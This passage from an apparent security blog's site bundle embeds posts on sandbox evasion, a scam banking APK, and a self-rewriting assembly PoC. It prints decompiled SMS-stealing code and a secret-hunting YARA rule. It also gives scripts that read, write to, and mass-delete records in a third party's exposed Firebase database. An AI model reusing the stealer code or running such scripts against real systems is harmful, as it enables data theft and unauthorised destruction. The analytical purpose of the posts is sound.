- **Realistic user simulation**: Implementing convincing mouse, keyboard, and UI interaction patterns
- **Historical data injection**: Populating systems with realistic usage artifacts and history
- **Custom hypervisors**: Developing specialized analysis platforms without known signatures
- **Nested virtualization**: Implementing layered virtualization to obscure detection
- **Bare-metal analysis**: Using physical hardware for high-value targets to eliminate virtualization indicators

As malware evasion evolves, analysis platforms continuously adapt their concealment techniques.

### Hook Concealment Strategies

Advanced monitoring techniques prioritize stealth:

- **Userland/kernel hybrid hooking**: Distributing hook components across privilege boundaries
- **Just-in-time hooking**: Applying and removing hooks dynamically to minimize detection windows
- **Monitoring from outside the process**: Using DLL injection or remote thread techniques
- **Hardware-assisted debugging**: Leveraging CPU debug registers and features via \`VirtualProtect\`
- **Hypervisor-level introspection**: Monitoring from outside the operating system using VMI techniques
- **Path diversion techniques**: Redirecting execution without modifying function code
- **Trap-based monitoring**: Using processor traps instead of code modification for interception

Hook concealment represents the cutting edge in the ongoing malware analysis arms race.

## Conclusion

The techniques described in this guide represent the technical landscape of malware sandbox detection and evasion. Modern malicious code typically employs multiple detection vectors with complex decision trees, requiring analysts to address numerous evasion techniques simultaneously.

The most sophisticated threats combine temporal evasion, environmental fingerprinting, and external verification to create significant challenges for automated analysis systems. Effective malware analysis requires a multi-faceted approach combining traditional sandboxing with bare-metal analysis, network simulation, and specialized hypervisor technologies.

By understanding the technical details of evasion techniques, security professionals can develop more comprehensive detection and analysis strategies to counter increasingly sophisticated malware.

## Contributing  
Contributions are welcome! If you have insights, corrections, or additional techniques related to malware evasion, feel free to submit a pull request or open an issue.  

Let's build a comprehensive resource together! 

## If you find this  helpful kindly drop a star on my [github repo](https://github.com/arxhr007/Malware-Sandbox-Evasion/)
`,Sf=`# How I Turned the Tables on a Scammer by Reverse Engineering Their Banking Trojan App

## Introduction

Recently, I received a suspicious APK file from someone attempting to scam me. They claimed to be from a state bank. Instead of falling victim, I decided to investigate the app and see exactly what it was trying to do. What I found was shocking - not only was the app collecting sensitive user data, but the developer had left their database completely exposed. Here's how I discovered the vulnerability and turned the tables on the scammer.

> **Note:** All the content is easy and simple, so non-Geek people can understand. Don't worry!

![bank](https://i.ibb.co/v47Z5qLx/bank.jpg)



## Step 1: Unpacking the APK

An APK (Android Package Kit) is essentially a zip file with a different extension. My first step was to unzip it to examine its contents using apktool:

\`\`\`bash
apktool d scam.apk 
\`\`\`

![apktool](https://i.ibb.co/x85f00V6/apkt.png)

After unpacking, I found the standard APK structure including the \`classes.dex\` files (containing compiled code) and \`resources.arsc\` (containing the app's resources).

![unzip](https://i.ibb.co/8nTJmJ67/Screenshot-from-2025-04-02-19-26-32.png)


### APK Structure Deep Dive

The unpacked APK revealed a typical Android app structure:

- **classes.dex files** - These contain the compiled bytecode that the Android runtime executes
- **res/** directory - Contains all app resources such as layouts, strings, and images
- **AndroidManifest.xml** - Defines the app's structure, components, and permissions
- **assets/** - Contains additional resources used by the app
- **resources.arsc file** - compiled resource file that stores precompiled Android resources like strings, colors, dimensions, and localized content.


Looking at the AndroidManifest.xml, I noticed the app requested extensive permissions including:

- READ_SMS
- READ_CONTACTS  
- READ_PHONE_STATE
- RECEIVE_SMS
- INTERNET

These permissions alone should raise red flags, as a legitimate banking app would not need access to read all SMS messages or contacts.

## Step 2: Decompiling with JADX

The next step was to convert the DEX files back into readable Java source code. For this, I used JADX, a popular DEX to Java decompiler.

Instead of manually running JADX on each file, I created a bash script to recursively process all the files:

\`\`\`bash
#!/bin/bash
APK_FOLDER="scam"
find "$APK_FOLDER" \\( -iname "*.dex" -o -iname "*.arsc" \\) -type f -print0 | while IFS= read -r -d '' file; do
    output_dir="\${file}_jadx"
    echo "Decompiling file: $file"
    mkdir -p "$output_dir"
    jadx -d "$output_dir" "$file"
done
\`\`\`

Output:
\`\`\`
arn@arxhr007:~/Desktop/scam$ bash decompile.sh 
Decompiling file: scam/classes2.dex
INFO  - loading ...
INFO  - processing ...
INFO  - done                                                 
Decompiling file: scam/classes.dex
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 3                       
Decompiling file: scam/classes3.dex
INFO  - loading ...
INFO  - processing ...
INFO  - done                                                 
Decompiling file: scam/resources.arsc
INFO  - loading ...
INFO  - processing ...
INFO  - done 
\`\`\`

This gave me access to the app's source code which I thought might be obfuscated, but luckily it wasn't. Now I could analyze it for suspicious activity.

### Key Code Findings

Examining the decompiled code, I found several concerning components like this and much more:

\`\`\`java
// SMS collection and forwarding mechanism
    public void onReceive(Context ctx, Intent data) {
        Bundle bundle;
        Object[] pduArray;
        Log.d("SMSListener", "SMS Received");
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(data.getAction()) || (bundle = data.getExtras()) == null || (pduArray = (Object[]) bundle.get("pdus")) == null) {
            return;
        }
        for (Object pdu : pduArray) {
            SmsMessage sms = Build.VERSION.SDK_INT >= 23 ? SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format")) : SmsMessage.createFromPdu((byte[]) pdu);
            String text = sms.getMessageBody();
            String sender = sms.getOriginatingAddress();
            String deviceId = new DeviceInfoService(ctx).getId();
            TelephonyManager telManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String networkInfo = telManager != null ? "Provider: " + telManager.getNetworkOperatorName() + ", SIM: " + telManager.getLine1Number() : "Unknown";
            if (sender != null && !text.isEmpty()) {
                processSMS(ctx, sender, text, networkInfo);
                logSMS(ctx, sender, text, networkInfo, deviceId);
            }
        }
    }

\`\`\`

This code was intercepting all incoming SMS messages and uploading them to Firebase. While legitimate banking apps might need to read OTP messages, they would never upload the full content of all SMS messages to an external server.

## Step 3: Writing a YARA Rule to Find API Keys

Looking through thousands of lines of code manually would be tedious, so I created a YARA rule specifically designed to find API keys and sensitive credentials.

### What is YARA?

YARA is a pattern matching tool designed to help malware researchers identify and classify malware. It's often described as "the Swiss Army knife of pattern matching" and allows you to create rules (based on textual or binary patterns) to search for specific strings or patterns in files. YARA rules are widely used in cybersecurity for:

- Malware detection and classification
- Threat hunting
- Digital forensics
- Incident response
- Reverse engineering

YARA rules consist of three main components: meta information, strings definitions, and conditions. The strings section defines patterns to search for, while the conditions section defines the logic for when a rule should match.

Here's the YARA rule I created:

\`\`\`bash
rule APK_Analysis
{
    meta:
        author = "arxhr007"
        description = "Detects backend technologies, API keys, and sensitive info in an APK"
    strings:
        $api_key_google      = /AIza[0-9A-Za-z-_]{35}/
        $api_key_firebase    = /AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}/
        $api_key_aws         = /AKIA[0-9A-Z]{16}/
        $api_key_other       = /\\b[0-9a-f]{32}\\b/
        $api_key_stripe      = /sk_live_[0-9a-zA-Z]{24}/
        $api_key_slack       = /xox[baprs]-[0-9A-Za-z]{10,48}/
        $api_key_github      = /ghp_[0-9A-Za-z]{36}/
        $api_key_mailgun     = /key-[0-9a-zA-Z]{32}/
        $api_key_twilio_sid  = /AC[0-9A-Za-z]{32}/
        $firebase_url            = /https:\\/\\/[^"'\\s]+\\.firebaseio\\.com/
        $graphql                 = /graphql/i
        $php_backend             = /\\.php["']/
        $node_backend            = /express|koa|sails/i
        $django_backend          = /django|rest_framework/i
        $laravel_backend         = /laravel|Illuminate/i
        $jwt                     = /eyJ[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]{10,}/
        $sql_creds               = /(jdbc:mysql:\\/\\/|postgres:\\/\\/|mongodb:\\/\\/)[^"'\\s]+/
        $firebase_service_account= /"type":\\s*"service_account".{1,500}"private_key":\\s*"-----BEGIN PRIVATE KEY-----/s
        $hardcoded_passwords     = /(password\\s*=\\s*"[^"]+"|password:\\s*"[^"]+")/i
    condition:
        any of (
            $api_key_google,
            $api_key_firebase,
            $api_key_aws,
            $api_key_other,
            $api_key_stripe,
            $api_key_slack,
            $api_key_github,
            $api_key_mailgun,
            $api_key_twilio_sid
        ) or any of (
            $firebase_url,
            $graphql,
            $php_backend,
            $node_backend,
            $django_backend,
            $laravel_backend,
            $jwt,
            $sql_creds,
            $firebase_service_account,
            $hardcoded_passwords
        )
}
\`\`\`

I ran the rule against the decompiled sources (the entire folder):

\`\`\`bash
yara -w -r -s apk_yara.yar scam
\`\`\`

Output:

![YARA results](https://i.ibb.co/nMXzwVvq/finalreal.jpg)

## Step 4: Jackpot - Finding the Firebase Database

The scan revealed something critical: the app was using Firebase Realtime Database with an exposed API key. Even more concerning, the database had no proper security rules in place.

The URL structure looked something like:
\`\`\`
https://xcpbank-app-rtdb.firebaseio.com/
\`\`\`
> Note : For this blog I used fake firebase realtime database url of Scammer for Ethical reasons !
## Step 5: Investigating the Database

Using Python and the Firebase REST API, I wrote a script to check what data was being stored:

\`\`\`python
import requests
import json

database_url = 'https://xcpbank-app-rtdb.firebaseio.com'  
response = requests.get(f'{database_url}.json')  
if response.status_code == 200:
    data = response.json()  
    with open('data.json', 'w') as json_file:
        json.dump(data, json_file, indent=4)  
    print("Data saved successfully.")
\`\`\`

Output data.json:

![Database data](https://i.ibb.co/V078y31N/data.jpg)

To my horror, I found the database contained information from over 100,000 victims, including:
- Full names
- Phone numbers
- MPINs 
- SMS messages
- Device information
- And much more personal data


This data would give scammers everything they need to perform financial fraud, identity theft, and social engineering attacks.

## Step 6: Testing Write Access

I needed to confirm if the database had proper write restrictions:

\`\`\`python
import requests
import json

firebase_url = "https://xcpbank-app-rtdb.firebaseio.com/test.json"
test_data = {"message": "Testing write access"}

response = requests.put(firebase_url, json=test_data)
print(response.status_code)
print(response.text)
\`\`\`

Output:

![Write access test](https://i.ibb.co/9mGcKQrB/write.png)

The result was alarming - I had full read AND write access to the entire database. This represented a serious security vulnerability that put thousands of people's data at risk.

## Step 7: Ethical Countermeasure - The Scammer-Spammer Script

To protect the victims and neutralize the scammer's operation without causing harm, I decided to replace the stolen data with generated fake data. In the JSON file, there was a node called "sms" which contained sensitive information. I wrote a Python script called [scammer-spammer.py](https://pastebin.com/raw/RyBuLTNk) to handle this task.

### Understanding the scammer-spammer.py Script

Here's a breakdown of how the script works:

\`\`\`python
import requests
import json
import re
from faker import Faker
import time
from concurrent.futures import ThreadPoolExecutor

database_url = 'https://xxx-rtdb.firebaseio.com'
fake = Faker()

def sanitize_firebase_key(key):
    return re.sub(r'[\\.\\$\\#\\[\\]\\/]', '_', key)

def generate_fake_data():
    return {
        "device_id": fake.uuid4(),
        "model": f"{fake.first_name()}'s {fake.random_element(['A54', 'M21', 'F19', 'X10'])}",
        "number": f"SIM 1: Operator - {fake.random_element(['jio', 'airtel', 'vodafone'])}, Number - {fake.phone_number()}",
        "time": fake.date_time_this_year().strftime("%m-%d-%Y | %H:%M")
    }

def insert_data(data, path="users"):
    try:
        url = f"{database_url}/{path}.json"
        response = requests.post(url, json=data)
        if response.status_code == 200:
            print(f"Data successfully inserted: {data}")
            return response.json()
        else:
            print(f"Error: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"An error occurred: {e}")

def delete_data(node_id, path="users"):
    try:
        node_id = sanitize_firebase_key(node_id) 
        url = f"{database_url}/{path}/{node_id}.json"
        response = requests.delete(url)
        if response.status_code == 200:
            print(f"Node with ID '{node_id}' successfully deleted.")
        else:
            print(f"Error: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"An error occurred: {e}")

def get_node_ids_from_json(file_path="data.json"):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
            if isinstance(data, list):
                return data
            else:
                print("JSON data is not in the expected format (list of node IDs).")
                return []
    except Exception as e:
        print(f"An error occurred while reading the JSON file: {e}")
        return []

def remove_node_id_from_json(node_id, file_path="data.json"):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        if node_id in data:
            data.remove(node_id)
        with open(file_path, 'w') as file:
            json.dump(data, file, indent=4)
        print(f"Node ID '{node_id}' removed from the JSON file.")
    except Exception as e:
        print(f"An error occurred while updating the JSON file: {e}")

def insert_fake_data_multithreaded(num_entries, max_threads=5, json_file_path="data.json"):
    node_ids = get_node_ids_from_json(json_file_path)
    if not node_ids:
        print("Replaced all users")
        return

    with ThreadPoolExecutor(max_threads) as executor:
        futures = []
        for _ in range(num_entries):
            fake_data = generate_fake_data()
            futures.append(executor.submit(insert_data, fake_data, "users"))
            
            if node_ids:
                node_id_to_delete = sanitize_firebase_key(node_ids.pop(0))
                futures.append(executor.submit(delete_data, node_id_to_delete))
                futures.append(executor.submit(remove_node_id_from_json, node_id_to_delete, json_file_path))
                
            if not node_ids:
                print("Replaced all users")
                break
                
        for future in futures:
            try:
                result = future.result()
                print(f"Insertion, Deletion or Removal result: {result}")
            except Exception as e:
                print(f"Error in thread execution: {e}")

if __name__ == "__main__":
    num_entries = 10000
    max_threads = 10
    json_file_path = "data.json"
    
    start_time = time.time()
    insert_fake_data_multithreaded(num_entries, max_threads, json_file_path)
    end_time = time.time()
    
    print(f"Completed insertion of {num_entries} entries, deletion of users, and removal from JSON in {end_time - start_time:.2f} seconds")
\`\`\`

#### Script Breakdown:

1. **Data Generation**: The \`generate_fake_data()\` function creates realistic but completely fake device information using the Faker library.

2. **Firebase Interactions**: Functions like \`insert_data()\` and \`delete_data()\` handle the communication with the Firebase database, allowing me to replace real data with fake data.

5. **Multi-threading**: To speed up the process, the script uses ThreadPoolExecutor to run multiple operations concurrently. This is crucial when dealing with a large database of over 100,000 entries.

4. **Tracking Progress**: The script keeps track of processed IDs in a local JSON file to ensure all data is replaced and to resume if interrupted.

![Script in action](https://i.ibb.co/3mQzJGcY/real-work.png)



## Conclusion
Finally, I replaced the entire scammers database with fake data.😌

This experience highlights several important lessons:

1. **Always be cautious with APK files from unknown sources**
2. **Proper security configuration is critical for cloud databases**
3. **API keys should never be hardcoded in mobile applications**
4. **Firebase and similar services require careful security rule setup**
5. **Multithreaded approaches can be effective for dealing with large-scale data cleanup**
6. **Even amateur researchers can make a significant impact on security**



Remember: reverse engineering should only be done ethically and legally, and finding vulnerabilities comes with the responsibility to disclose them properly.

Stay safe online!`,_f=`# How Polymorphic Binaries Work: Dissecting a Self-Modifying FASM PoC

> **Educational PoC only.** All techniques shown come from publicly available malware research. The payload is a harmless string. Source: [arxhr007/self-modifying-binary-PoC](https://github.com/arxhr007/self-modifying-binary-PoC).

Signature-based antivirus works by matching known byte patterns against files on disk. Feed it a binary it has never seen before and it has nothing to match. Polymorphic malware exploits this: it mutates its own bytes on every execution so no two copies share the same signature.

This post dissects a minimal PoC written in FASM (Flat Assembler) for x86-64 Linux that demonstrates exactly how this works. By the end you'll understand the marker-scanning self-locate trick, the rotating XOR cipher, the write-then-replace technique, and — crucially — why none of this defeats a behavioral detection engine.

---

## Binary Layout: Marker-Delimited Regions

The first problem any self-modifying binary faces: how does it find its own data inside the file? You can't use fixed offsets; the assembler and linker shift things around. ELF section headers are an option, but parsing them is complex. This PoC uses a simpler trick: ASCII sentinel markers embedded directly in the data segment.

Three regions are defined, each preceded by a unique ASCII tag:

\`\`\`asm
; Key marker and key storage
marker_begin_key: db "KEYBEGIN/9a7c4f2e:"
key: dd 0x12345678               ; 32-bit XOR key (initial value)

; Payload metadata
marker_begin_metadata: db "METAMETA/4d7a2c5b:"
payload_stored_length: dd 10     ; payload byte count
payload_checksum: dd 0x00000000  ; XOR fold of plaintext

; Encrypted payload
marker_begin_payload: db "PAYLOAD/5b2e1c9d:"
; "HELLOWORLD" XOR 0x12345678 (little-endian key bytes: 0x78, 0x56, 0x34, 0x12)
; H=0x48^0x78=0x30  E=0x45^0x56=0x13  L=0x4C^0x34=0x78  L=0x4C^0x12=0x5E
; O=0x4F^0x78=0x37  W=0x57^0x56=0x01  O=0x4F^0x34=0x7B  R=0x52^0x12=0x40
; L=0x4C^0x78=0x34  D=0x44^0x56=0x12  (null terminator not part of payload)
payload: db 0x30, 0x13, 0x78, 0x5E, 0x37, 0x01, 0x7B, 0x40, 0x34, 0x12, 0x00
payload_max_len = 31  ; 0x00 is a C-string terminator; payload_stored_length=10 excludes it
\`\`\`

At runtime, when the binary wants to rewrite itself, it reads its own file into a fixed 64 KB static buffer (\`file_buffer: rb 65536\`) and linearly scans for those byte sequences. The moment it finds \`KEYBEGIN/9a7c4f2e:\`, the next 4 bytes are the key. Find \`PAYLOAD/5b2e1c9d:\` and the next \`payload_stored_length\` bytes are the ciphertext to patch. No ELF header parsing required.

The fixed buffer is also a hard limit: the read routine checks the file size against 65536 and bails out if the binary is larger, so this design only works for small single-file binaries. A production tool would size the buffer dynamically or reject oversized input explicitly rather than relying on a compile-time constant.

The marker strings include random-looking hex suffixes (\`9a7c4f2e\`, \`5b2e1c9d\`) to avoid false positives if the payload ever happens to contain the word \`PAYLOAD\`.

---

## The XOR Cipher

Encryption here is a 4-byte rotating XOR. The 32-bit key is split into its four constituent bytes in little-endian order, then applied cyclically:

\`\`\`
Key 0x12345678 → bytes [0x78, 0x56, 0x34, 0x12]

position 0:  byte ^= 0x78
position 1:  byte ^= 0x56
position 2:  byte ^= 0x34
position 3:  byte ^= 0x12
position 4:  byte ^= 0x78   ← wraps
...
\`\`\`

The assembly that implements it:

\`\`\`asm
; xor_payload: rsi=src, rdi=dst, ecx=length, eax=key
xor_payload:
    ; Key arrives in eax; copy to ebx so al is free for byte loads
    mov ebx, eax
    ; Unpack key into four byte registers
    mov r8b, bl          ; key[0] = byte 0 (low)
    shr ebx, 8
    mov r9b, bl          ; key[1]
    shr ebx, 8
    mov dl,  bl          ; key[2]
    shr ebx, 8
                         ; key[3] now in bl

    xor r10, r10         ; position counter
.xor_loop:
    test ecx, ecx
    jz .xor_done
    mov al, [rsi]        ; load source byte
    mov r11, r10
    and r11, 3           ; r11 = position % 4
    cmp r11, 0
    je .use_key0
    cmp r11, 1
    je .use_key1
    cmp r11, 2
    je .use_key2
    xor al, bl           ; key[3]
    jmp .store_result
.use_key0:
    xor al, r8b
    jmp .store_result
.use_key1:
    xor al, r9b
    jmp .store_result
.use_key2:
    xor al, dl
.store_result:
    mov [rdi], al
    inc rsi
    inc rdi
    inc r10
    dec ecx
    jmp .xor_loop
\`\`\`

**Why this can invalidate naive byte-pattern signatures:** the encrypted bytes change with every new key. A signature that depends on the exact ciphertext bytes will fail to match after one run. The binary's code segment is unchanged, so scanners that use structural features, heuristics, or entropy analysis are unaffected by this technique.

**Why this is trivially breakable:** XOR with a known plaintext is trivially reversible. If an analyst knows (or guesses) any portion of the plaintext, they recover the key in one XOR. Sophisticated polymorphic malware layers this with compression, multiple cipher rounds, and metamorphic code restructuring. This PoC is the minimal baseline.

---

## Execution Flow: Run → Decrypt → Mutate → Persist

Here is what happens on each execution, step by step:

**1. Locate self.** The binary reads \`argv[0]\` to get its own path. This is the file it will overwrite.

**2. Validate.** It checks that the stored \`payload_stored_length\` is sane and that the XOR-fold checksum of the decrypted payload matches \`payload_checksum\`. If either fails, it halts.

**3. Decrypt and print.** It calls \`xor_payload\` to decrypt the current ciphertext into a stack buffer, then writes it to stdout.

**4. Generate a new key.** This is the mutation step. A fresh 32-bit key is requested from the kernel:

\`\`\`asm
generate_new_key:
    mov rax, 318        ; sys_getrandom
    mov rdi, new_key    ; destination buffer
    mov rsi, 4          ; 4 bytes
    mov rdx, 0          ; flags (blocking)
    syscall
    cmp rax, 4
    je .done
    ; fallback: /dev/urandom via open/read/close
\`\`\`

\`sys_getrandom\` (syscall 318 on x86-64 Linux) pulls bytes directly from the kernel CSPRNG. The fallback opens \`/dev/urandom\` manually with raw syscalls — no libc, no dynamic linking.

**5. Re-encrypt.** The decrypted plaintext is XOR'd with the new key, producing a new ciphertext.

**6. Patch the in-memory binary image.** The entire binary is read into the 64 KB static buffer. Three marker scans locate the key field, metadata block, and payload region. All three are overwritten in the buffer with their new values.

**7. Write and replace self.** The patched buffer is written to \`argv[0].tmp\`, then:

\`\`\`asm
replace_original_with_temp:
    mov rax, 87             ; sys_unlink — delete original
    mov rdi, [orig_filename]
    syscall

    mov rax, 82             ; sys_rename — temp becomes original
    mov rdi, temp_filename
    mov rsi, [orig_filename]
    syscall
\`\`\`

---

## The Write-Then-Replace Pattern

Writing directly to the binary while it's executing is risky: an interruption mid-write can corrupt the file. The safer pattern writes a complete replacement first, then swaps the filename.

This PoC uses an \`unlink\` → \`rename\` sequence:

1. Write the full patched image to \`argv[0].tmp\`.
2. \`sys_unlink\` the original — the pathname disappears.
3. \`sys_rename\` the temp file to the original name.

**The gap.** This is not atomic. Between \`sys_unlink\` completing and \`sys_rename\` completing, the original pathname does not exist. If the process is killed or the rename fails in that window, the executable is gone. A truly atomic replacement on Linux passes the destination path directly to \`rename()\` without unlinking first — \`rename()\` can replace an existing destination atomically when both paths are on the same filesystem. This PoC's unlink-first approach sacrifices that guarantee, but works in practice for a single-threaded self-rewriter with no concurrent writers on the file.

**Forensic consequence.** When \`sys_rename\` completes, the on-disk binary references a new inode with the updated bytes. The process that just ran, however, was mapped from the old inode. Linux keeps open file descriptors and memory mappings alive until all references drop, so the running process's pages still reflect the pre-mutation image. An incident responder who hashes the binary on disk after execution and compares it to a memory dump of the process would see divergence — the on-disk and in-memory images are different files. The exact comparison requires identifying the correct mapped region in \`/proc/<pid>/maps\` and \`/proc/<pid>/mem\`, not a simple xxd diff, but the divergence is real and repeatable.

---

## What This Looks Like to Behavior-Based Detection

Signature scanners match bytes. Behavioral engines watch what programs *do*. This PoC's syscall sequence is distinctive regardless of what the bytes look like:

\`\`\`
open(argv[0], O_RDONLY)         ← process opens its own binary
lseek(fd, 0, SEEK_END)          ← sizes itself
read(fd, buf, size)             ← reads itself into memory
close(fd)
getrandom(new_key, 4, 0)        ← requests kernel entropy
open("argv[0].tmp", O_WRONLY|O_CREAT, 0755)
write(fd_tmp, patched_buf, size) ← writes modified image
close(fd_tmp)
unlink(argv[0])                 ← deletes itself
rename("argv[0].tmp", argv[0])  ← replaces itself
\`\`\`

A process opening its own executable path, reading it, modifying the bytes, and then replacing the file via rename is a strong behavioral IOC (indicator of compromise). EDR products and sandboxes that trace syscall sequences or monitor filesystem events can flag this pattern independent of any byte signature.

Polymorphism that mutates only the encrypted data region — as this PoC does — leaves the code segment completely unchanged, so any signature anchored to stable code bytes still matches. Modern malware pairs byte mutation with additional techniques like metamorphism (restructuring the code itself), process hollowing, signed binary abuse, or living-off-the-land tactics. This PoC demonstrates the baseline that those techniques build on.

---

## Proof: Running It

Compiled with FASM 1.73.32 on Ubuntu 24.04 (WSL2, x86-64). Three consecutive runs:

\`\`\`bash
$ ./selfrewrite
Current key: 305419896
Payload length validation: PASS
Encrypted payload (hex): 3013785E37017B403412
Payload checksum verification: PASS
Decrypted payload: HELLOWORLD
New key: 2508764718
Re-encrypted payload (hex): 66F3C4D961E1C7C762F2
Binary updated with new key and payload re-encrypted

$ ./selfrewrite
Current key: 2508764718
Payload length validation: PASS
Encrypted payload (hex): 66F3C4D961E1C7C762F2
Payload checksum verification: PASS
Decrypted payload: HELLOWORLD
New key: 2111318775
Re-encrypted payload (hex): BF6F9431B87D972FBB6E
Binary updated with new key and payload re-encrypted

$ ./selfrewrite
Current key: 2111318775
Payload length validation: PASS
Encrypted payload (hex): BF6F9431B87D972FBB6E
Payload checksum verification: PASS
Decrypted payload: HELLOWORLD
New key: 3642765678
Re-encrypted payload (hex): 26746C9521666F8B2275
Binary updated with new key and payload re-encrypted
\`\`\`

Each run: key mutates, ciphertext changes, plaintext stays \`HELLOWORLD\`. A signature anchored to the payload ciphertext bytes would fail to match after the first run. The code segment — everything outside the three marker regions — is byte-for-byte identical across all runs.

### Hex dump: on-disk mutation

\`xxd\` of the binary before and after a single run, showing only the changed lines:

\`\`\`text
13c13
< 000000c0: 653a 7856 3412 4d45 5441 4d45 5441 2f34  e:xV4.METAMETA/4
---
> 000000c0: 653a 7e32 5317 4d45 5441 4d45 5441 2f34  e:~2S.METAMETA/4
16c16
< 000000f0: 3a30 1378 5e37 017b 4034 1200 2f70 726f  :0.x^7.{@4../pro
---
> 000000f0: 3a36 771f 5b31 651c 4532 7600 2f70 726f  :6w.[1e.E2v./pro
\`\`\`

Line \`0x0c0\` is the key field (immediately after \`KEYBEGIN/9a7c4f2e:\`). Line \`0x0f0\` is the encrypted payload (immediately after \`PAYLOAD/5b2e1c9d:\`). Those are the only two regions that change — everything else, including the code itself, is identical.

---

## Conclusion

Self-modifying code is not new. The concept predates modern AV by decades. But it remains relevant as a foundation: polymorphic malware families — which change their encrypted representation each generation — and metamorphic families — which restructure their code itself — both rely on the same core primitives this PoC exposes: locate your own data, mutate it, replace the file on disk.

What this PoC makes concrete:

- **Marker-based self-location** is simpler than ELF section parsing for small, single-file binaries. Robustness requires validating bounds after every marker find.
- **Rotating XOR can invalidate a naive ciphertext-anchored signature** and is insufficient to withstand any real cryptanalysis.
- **Unlink-then-rename** avoids partial-write corruption but is not atomic — there is a brief window where the original pathname does not exist. It creates a forensically interesting inode-vs-pathname divergence after completion.
- **Behavioral monitoring can detect this pattern** regardless of what the bytes look like, because the syscall sequence of a process that reads and replaces its own binary is distinctive.

Source: [github.com/arxhr007/self-modifying-binary-PoC](https://github.com/arxhr007/self-modifying-binary-PoC)
`,Tc=Object.assign({"./blogs/parivahan-scam.md":kf,"./blogs/rust-malware.md":wf,"./blogs/sandbox-evasion.md":xf,"./blogs/scam-app.md":Sf,"./blogs/self-modifying-binary.md":_f});function $c(a){const o=Object.keys(Tc).find(l=>l.endsWith(`/${a}.md`));return o?Tc[o]:""}function Ef(a){const o=a.trim().split(/\s+/).filter(Boolean).length;return Math.max(1,Math.ceil(o/200))}const Tf=[{slug:"self-modifying-binary",title:"How Polymorphic Binaries Work: Dissecting a Self-Modifying FASM PoC",description:"A deep dive into a FASM x86-64 program that re-encrypts its own payload with a new random key on every run — and why that defeats signature-based AV.",tags:["Assembly","Malware PoC","Reverse Engineering","Linux"],date:"2026-10-12"},{slug:"parivahan-scam",title:"Android Malware Analysis: A Sophisticated SMS Stealer",description:"Reverse engineering a fake Parivahan APK spread over WhatsApp that exfiltrates victims' SMS messages.",tags:["Android","Malware Analysis","Reverse Engineering"],date:"2025-07-14"},{slug:"rust-malware",title:"Hacking Printers: Intercepting Print Jobs with Rust Malware",description:"How Windows printing works, where raw print data lives, and a Rust PoC that captures .SPL spool files.",tags:["Rust","Windows","Malware PoC"],date:"2025-06-02"},{slug:"scam-app",title:"Turning the Tables on a Scammer's Banking Trojan",description:"Analyzing a fake bank APK, finding the developer's exposed database, and flipping the attack.",tags:["Android","Reverse Engineering","OSINT"],date:"2025-04-20"},{slug:"sandbox-evasion",title:"Sandbox Evasion: How Malware Detects Analysis Environments",description:"A technical tour of the techniques malware uses to spot sandboxes and VMs, and the countermeasures analysts use.",tags:["Malware","Sandbox","Anti-Analysis"],date:"2025-03-08"}],Ct=Tf.map(a=>({...a,readingTime:Ef($c(a.slug))})).sort((a,o)=>a.date<o.date?1:-1);function Pf(a){const o=Ct.find(l=>l.slug===a);return o?{meta:o,markdown:$c(a)}:null}function Cf(a){const o=Ct.findIndex(l=>l.slug===a);return o===-1?{}:{next:Ct[o-1],prev:Ct[o+1]}}function dl(a){return new Date(a+"T00:00:00Z").toLocaleDateString("en-US",{year:"numeric",month:"short",day:"numeric",timeZone:"UTC"})}function bf(){Oc([]);const a=Ct.slice(0,2);return y.jsxs("main",{className:"container",children:[y.jsx("section",{className:"card",children:y.jsxs("div",{className:"hero",children:[y.jsx("img",{className:"avatar",src:"/Aaron.webp",alt:se.name,width:180,height:180}),y.jsxs("div",{children:[y.jsx("h1",{children:se.name}),y.jsx("p",{className:"subtitle",children:se.title}),y.jsxs("div",{className:"meta",children:[y.jsx("span",{children:se.location}),y.jsx("a",{href:`mailto:${se.email}`,children:se.email})]}),y.jsxs("div",{className:"meta",children:[y.jsx("a",{href:se.links.github,target:"_blank",rel:"noreferrer",children:"GitHub"}),y.jsx("a",{href:se.links.linkedin,target:"_blank",rel:"noreferrer",children:"LinkedIn"}),y.jsx("a",{href:se.links.website,target:"_blank",rel:"noreferrer",children:"arxhr007.tech"})]})]})]})}),y.jsxs("section",{className:"card reveal",children:[y.jsx("h2",{children:"Profile"}),y.jsx("p",{className:"about-text",children:y.jsx(Mc,{children:lf})})]}),y.jsxs("section",{className:"card tech-skills reveal",children:[y.jsx("h2",{children:"Technical Skills"}),y.jsx("div",{className:"grid-2",children:af.map(o=>y.jsxs("div",{children:[y.jsx("h3",{children:o.group}),y.jsx(Ec,{items:o.items})]},o.group))})]}),y.jsxs("section",{className:"card reveal",children:[y.jsx("h2",{children:"Experience"}),uf.map((o,l)=>y.jsxs("article",{className:"job",children:[y.jsxs("div",{className:"job-head",children:[y.jsxs("h3",{children:[o.role," •"," ",o.url?y.jsxs("a",{href:o.url,target:"_blank",rel:"noreferrer",children:[o.company," ↗"]}):o.company]}),y.jsx("span",{className:"job-meta",children:o.meta})]}),y.jsx(Mr,{items:o.points})]},l))]}),y.jsxs("section",{className:"card reveal",children:[y.jsx("h2",{children:"Projects"}),y.jsx("div",{className:"grid-2",children:cf.map(o=>y.jsxs("div",{children:[y.jsx("h3",{className:"project-title",children:o.url?y.jsxs("a",{href:o.url,target:"_blank",rel:"noreferrer",children:[o.name," ↗"]}):o.name}),y.jsx("p",{className:"job-meta",style:{marginBottom:8},children:o.tagline}),y.jsx(Mr,{items:o.points}),y.jsx("div",{style:{marginTop:10},children:y.jsx(Ec,{items:o.tags})})]},o.name))})]}),y.jsxs("section",{className:"card reveal",children:[y.jsx("h2",{children:"Open Source Contributions"}),y.jsx(Mr,{items:df})]}),y.jsxs("section",{className:"card reveal",children:[y.jsxs("div",{className:"section-head",children:[y.jsx("h2",{children:"Writing"}),y.jsx(at,{to:"/blog",className:"see-all",children:"All posts 